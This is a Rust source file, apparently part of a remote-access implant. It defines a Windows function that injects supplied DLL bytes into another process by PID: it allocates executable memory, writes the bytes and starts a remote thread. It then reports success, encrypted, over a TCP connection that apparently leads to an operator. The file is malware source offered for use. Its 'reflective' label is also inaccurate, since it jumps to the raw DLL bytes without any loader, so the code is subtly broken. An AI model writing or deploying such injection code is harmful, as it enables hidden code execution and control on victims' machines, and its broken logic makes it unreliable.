#[cfg(windows)]
extern crate winapi;
#[cfg(windows)]
use std::ptr::null_mut;
#[cfg(windows)]
use winapi::shared::minwindef::{DWORD, LPVOID};
#[cfg(windows)]
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
#[cfg(windows)]
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
#[cfg(windows)]
use winapi::um::handleapi::CloseHandle;
#[cfg(windows)]
use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS};
#[cfg(windows)]
use std::{u8, net::TcpStream, io::Write};
#[cfg(windows)]
use simple_crypt::encrypt;

#[cfg(windows)]
pub fn reflective_inject(stream: &mut TcpStream, pid: DWORD, dll_bytes: &[u8], shared_secret: &[u8; 32]) -> bool {
    unsafe {
        // Open the target process
        let process: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            eprintln!("Failed to open process");
            return false;
        }

        // Allocate memory in the target process for the DLL
        let alloc_size = dll_bytes.len();
        let remote_memory: LPVOID = VirtualAllocEx(
            process,
            null_mut(),
            alloc_size,
            winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
        );
        if remote_memory.is_null() {
            eprintln!("Failed to allocate memory in target process");
            CloseHandle(process);
            return false;
        }

        // Write the DLL bytes into the allocated memory
        let write_result = WriteProcessMemory(
            process,
            remote_memory,
            dll_bytes.as_ptr() as *const _,
            alloc_size,
            null_mut(),
        );
        if write_result == 0 {
            eprintln!("Failed to write to process memory");
            CloseHandle(process);
            return false;
        }

        // Create a remote thread to execute the DLL's entry point
        let thread = CreateRemoteThread(
            process,
            null_mut(),
            0,
            Some(std::mem::transmute(remote_memory)),
            null_mut(),
            0,
            null_mut(),
        );
        if thread.is_null() {
            eprintln!("Failed to create remote thread");
            CloseHandle(process);
            return false;
        }

        println!("Reflective DLL injected successfully!");
        CloseHandle(thread);
        CloseHandle(process);
    }
    stream.write(&encrypt("Reflective DLL injected successfully!".as_bytes(), shared_secret).unwrap()).unwrap();
    true
}